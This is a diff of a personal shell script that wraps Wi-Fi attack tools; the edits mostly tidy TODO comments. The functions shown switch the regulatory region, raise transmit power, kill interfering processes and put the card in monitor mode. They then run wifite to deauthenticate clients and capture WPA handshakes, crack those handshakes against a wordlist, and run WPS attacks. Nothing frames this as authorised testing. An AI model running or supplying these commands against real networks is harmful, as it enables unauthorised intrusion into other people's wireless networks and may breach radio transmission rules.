@@ -16,24 +16,24 @@ restore_wifi() {
   )
 }
 
-prepare_wifi() {  # TODO WIP
+prepare_wifi() {
   (
     # iface_iw=phy0
     # ls /sys/class/ieee80211/*/device/net/* -d | sed -E 's|^.*(phy[^/]+)/.*/|\1 |'
     iface=${1:-$(get_first_iface)}
     new_region=${2:-PA}
-    # clear  # TODO WIP
+    # clear  # TODO: WIP
     # stop if any
     sudo airmon-ng stop "$iface"mon
     sudo ip link set "$iface" down
-    echo "Old region was $(iw reg get)"  # TODO WIP
+    echo "Old region was $(iw reg get)"  # TODO: WIP
     sudo iw reg set "$new_region"
-    echo "New region is $(iw reg get)"  # TODO WIP
-    # sudo iw phy $iface_iw reg set $new_region  # TODO https://hackware.ru/?p=4125
+    echo "New region is $(iw reg get)"  # TODO: WIP
+    # sudo iw phy $iface_iw reg set $new_region  # TODO: https://hackware.ru/?p=4125
     iw dev "$iface" get power_save
     sudo iw dev "$iface" set power_save off
     iw dev "$iface" get power_save
-    sudo iw dev "$iface" set txpower fixed 30mBm  # TODO WIP
+    sudo iw dev "$iface" set txpower fixed 30mBm  # TODO: WIP
     sudo ip link set "$iface" up
     iw dev
     sudo airmon-ng check kill
@@ -44,26 +44,26 @@ prepare_wifi() {  # TODO WIP
 
 prepare_wifite() {
   prepare_wifi "$1"
-  return  # TODO WIP
+  return
 }
 
-handshake_capture() {  # TODO WIP
+handshake_capture() {
   (
     iface=${1:-$(get_first_iface)}
-    prepare_wifite "$iface" || return 1  # TODO WIP
+    prepare_wifite "$iface" || return 1
     mkdir -p ~/hs
     sudo wifite -ab -mac --skip-crack -ic --showb --showm -i "$iface"mon -inf -p 900 --clients-only --no-wps --wpadt 30 --wpat 1200 --no-pmkid --hs-dir ~/hs
     restore_wifi "$iface"
   )
 }
 
-# TODO WIP
+# TODO: WIP
 alias crack_hs="mkdir -p ~/hs && sudo wifite --crack -ic --dict ~/wordlist-probable.txt --hs-dir ~/hs"
 
-wps_attack() {  # TODO WIP
+wps_attack() {
   (
     iface=${1:-wlp2s0}
-    prepare_wifite "$iface" || return 1  # TODO WIP
+    prepare_wifite "$iface" || return 1
     sudo wifite -ab -mac --skip-crack -ic --showb --showm -i "$iface"mon -inf -p 900 --wps-only --wps-timeouts 1000
     restore_wifi "$iface"
   )
